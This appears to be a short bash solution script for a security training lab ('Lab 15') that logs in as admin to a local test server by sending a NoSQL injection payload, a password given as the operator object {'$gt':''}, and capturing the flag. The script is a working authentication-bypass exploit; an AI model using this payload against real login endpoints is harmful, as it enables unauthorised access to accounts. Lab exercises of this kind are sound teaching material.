#!/usr/bin/env bash
# Lab 15 — a password that is an object is an operator. `$gt: ""` is true of
# every hash there is.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9150}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab15

open_lab "$SESSION" "$URL/"
send "$SESSION" "$REQ0" --create \
    --set method=POST --set path=/api/login \
    --set header.Content-Type=application/json \
    --set json.username=admin \
    --set 'json.password={"$gt":""}' | flag
